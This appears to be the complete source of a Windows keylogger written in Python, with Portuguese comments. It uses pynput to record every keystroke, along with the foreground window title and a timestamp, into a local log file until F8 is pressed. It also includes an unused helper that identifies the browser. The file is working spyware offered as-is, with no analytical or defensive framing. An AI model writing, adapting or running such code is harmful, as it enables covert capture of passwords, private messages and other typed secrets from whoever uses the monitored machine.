import os
import psutil
import win32gui
from datetime import datetime
from pynput import keyboard

def main():
    # Especificar o nome do arquivo (pode ser alterado)
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y_%H-%M")}.log'

    def get_active_window_title():
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title

    def get_browser_url():
        active_window_title = get_active_window_title()
        browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "brave.exe", "opera.exe"]
        
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in browsers:
                try:
                    window_title = get_active_window_title()
                    if window_title and window_title != "Unknown":
                        if " - " in window_title:
                            return window_title.split(" - ")[-2]
                        return window_title
                except Exception as e:
                    return str(e)
        return "Unknown"

    last_window_title = None  # Armazena o último título da janela ativa

    def on_press(key):
        nonlocal last_window_title
        current_window_title = get_active_window_title()
        
        if current_window_title != last_window_title:
            last_window_title = current_window_title
            with open(log_file, "a") as f:
                f.write(f'\n\n[Window: {current_window_title} - {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}] ')
        
        with open(log_file, "a") as f:
            try:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(key.char)
                else:
                    if key == keyboard.Key.enter:
                        f.write('\n')
                    elif key == keyboard.Key.space:
                        f.write(' ')
                    elif key == keyboard.Key.tab:
                        f.write('\t')
                    elif key == keyboard.Key.backspace:
                        f.write('[BACKSPACE]')
                    elif key == keyboard.Key.esc:
                        f.write('[ESC]')
                    elif hasattr(key, 'vk'):
                        if 0x30 <= key.vk <= 0x39:  # Números
                            f.write(chr(key.vk))
                        elif 0x60 <= key.vk <= 0x69:  # Números do teclado numérico
                            f.write(chr(key.vk - 0x30))
                        else:
                            f.write(f'[{key.vk}]')
                    else:
                        f.write(f'[{key}]')
            except Exception as e:
                f.write(f'[EXCEPTION] {str(e)}')

    def on_release(key):
        # Para cancelar o keylogger, pressione a tecla F8
        if key == keyboard.Key.f8:
            return False

    # Cria o listener do teclado
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
